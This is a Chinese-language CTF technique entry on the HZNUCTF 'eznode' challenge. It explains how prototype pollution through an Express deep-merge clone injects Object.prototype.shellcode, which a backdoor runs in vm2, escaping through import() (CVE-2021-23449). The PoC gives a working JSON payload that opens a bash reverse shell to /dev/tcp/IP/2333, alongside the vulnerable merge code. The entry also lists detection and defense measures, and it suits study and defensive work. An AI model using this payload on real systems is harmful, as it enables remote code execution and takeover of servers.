---
id: web-nodejs-prototype-pollution-json-clone-vm2-shellcode-backdoor
title: JSON body 深合并原型链污染注入 Object.prototype.shellcode：后门把 {}.shellcode 交给 vm2 执行，链上 import() 逃逸 RCE
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: json-merge-prototype-pollution-vm2-shellcode-backdoor
aliases:
- HZNUCTF eznode
- clone 原型链污染
- __proto__.shellcode
- vm2 shellcode 后门
- merge isObject Object.prototype
- 原型污染 vm2 逃逸
tags:
- nodejs
- prototype-pollution
- json
- merge
- vm2
- sandbox-escape
- child-process
- rce
cve:
- CVE-2021-23449
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:23:29+08:00'
  notes: 已对照原文核对：HZNUCTF eznode的merge/clone __proto__污染、isObject放行Object.prototype、{}.shellcode交vm2执行、import()逃逸反弹shell均与原文一致；原文未给vm2版本，未设affected_versions；未本机执行。
---

## 一句话结论

Express 应用把 `req.body` 经 `JSON.parse(JSON.stringify(...))` 后交给 `merge({}, body)` 克隆，且后门会执行 `new VM().run({}.shellcode)` 时，POST body 中的 `__proto__` 键会在 merge 递归时落到 `Object.prototype` 上，注入 `shellcode` 属性；随后 `{}.shellcode` 通过原型链读到该字符串并在 vm2 中执行，配合 CVE-2021-23449 的 `import()` 逃逸即可执行系统命令、反弹 shell。

## 原理

- 克隆函数 `merge(a, b)` 对 `for (var attr in b)` 的每个键：若 `isObject(a[attr]) && isObject(b[attr])` 则递归合并，否则直接赋值。`isObject = obj => obj && obj.constructor && obj.constructor === Object`。
- 当 `attr === '__proto__'` 时，`a` 是 `{}`，读取 `a["__proto__"]` 得到 `Object.prototype`；`Object.prototype.constructor === Object`，所以 `isObject(Object.prototype)` 为 true。攻击者传入的 `b["__proto__"]` 也是一个普通对象，`isObject` 同样为 true，于是递归调用 `merge(Object.prototype, 攻击者对象)`，把 `shellcode` 等属性写到真正的 `Object.prototype` 上——这是本链的关键：不是给 `a` 换原型，而是污染全局原型。
- Express 的 `express.json()` 先解析 body；`JSON.parse(JSON.stringify(req.body))` 会保留名为 `__proto__` 的 own 属性（JSON.parse 用 DefineOwnProperty 创建它），`for...in` 能枚举到，因此污染能穿过序列化/反序列化。
- `copybody.shit` 为真时调用后门 `backdoor()`，其内容是 `new VM().run({}.shellcode)`：`{}` 自己没有 `shellcode`，但原型链上已被污染，读到攻击者字符串并交给 vm2 执行。
- vm2 中的 shellcode 使用 `import('./foo.js')`（CVE-2021-23449）：动态 import 的结果对象来自宿主 realm，`res.toString.constructor("return this")()` 取宿主 global/process，再 `process.mainModule.require("child_process").execSync(...)` 执行反弹 shell。后门没有对 vm2 的 `import` 做限制。

## 触发条件

- Node.js + Express，`express.json()` 解析 JSON body，克隆函数使用 `for...in` + 递归 merge，且 `isObject` 只判断 `constructor === Object`（不排除 `Object.prototype`）。
- 应用存在读取空对象属性并交给 vm2 执行的后门，例如 `new VM().run({}.shellcode)`；且该后门由 body 中某个布尔字段（本例 `shit`）触发。
- vm2 版本未修复动态 import 逃逸（CVE-2021-23449）。
- 攻击者能 POST JSON 到该路由。

## 利用步骤

1. 获取/审计源码，确认 `clone` 的 merge 逻辑与 `backdoor()` 的 `new VM().run({}.shellcode)`。
2. 构造 body：`shit: 1` 触发后门，`__proto__` 对象携带 `shellcode` 字符串。
3. POST 到 `/`，`JSON.parse(JSON.stringify(body))` 保留 `__proto__` own 属性，`clone` 递归合并污染 `Object.prototype.shellcode`。
4. `copybody.shit` 为真 → `backdoor()` → `{}.shellcode` 读取污染值 → vm2 执行。
5. shellcode 内用 `import()` 逃逸到宿主 `process`，`child_process.execSync` 执行反弹 shell / 读 flag。

## PoC

POST body：

```json
{"shit":1,"__proto__":{"shellcode":"let res = import('./foo.js');res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync('bash -c \"bash -i >& /dev/tcp/IP/2333 0>&1\"').toString();"}}
```

对应的关键后端代码形态：

```javascript
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) merge(a[attr], b[attr]);
        else a[attr] = b[attr];
    }
    return a;
}
const clone = (a) => merge({}, a);

app.post('/', function (req, res) {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body);
    if (copybody.shit) backdoor();   // backdoor: new VM().run({}.shellcode)
    res.send("post shit ok");
});
```

## 变体与关联

- 变体：污染键可换成 `constructor.prototype`、嵌套键或编码后的 `__proto__`（取决于过滤）；sink 也可能是 `{}.shellcode` 之外的任意空对象属性读取。
- 变体：vm2 shellcode 可替换为其它 vm2 逃逸 payload；若目标 vm2 已修复 import，需要换用对应版本的逃逸。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]] 说明 merge 深合并与 JSON.parse 的 `__proto__` 差异；[[web-nodejs-prototype-pollution-inherited-property-subkey]] 是绕过 `__proto__` 过滤的替代路径。
- 关联：[[binary-pwn-sandbox-escape-vm2-2021-23449-dynamic-import-host-module]] 是本链 shellcode 所用的 vm2 `import()` 逃逸原语。

## 检测与防御

- 检测：merge/clone 的 `for...in` 是否处理 `__proto__`；`isObject` 是否会把 `Object.prototype` 当作可合并对象；是否存在 `{}.prop` 形式的动态执行 sink（尤其交给 vm/vm2）。
- 防御：合并时显式跳过 `__proto__`、`constructor`、`prototype`；用 `Object.create(null)` 或 Map 做配置容器；对 body 做 schema 白名单；不要用 vm/vm2 执行来自请求的数据，若必须执行则使用进程级隔离并禁用 `import`/`require`。
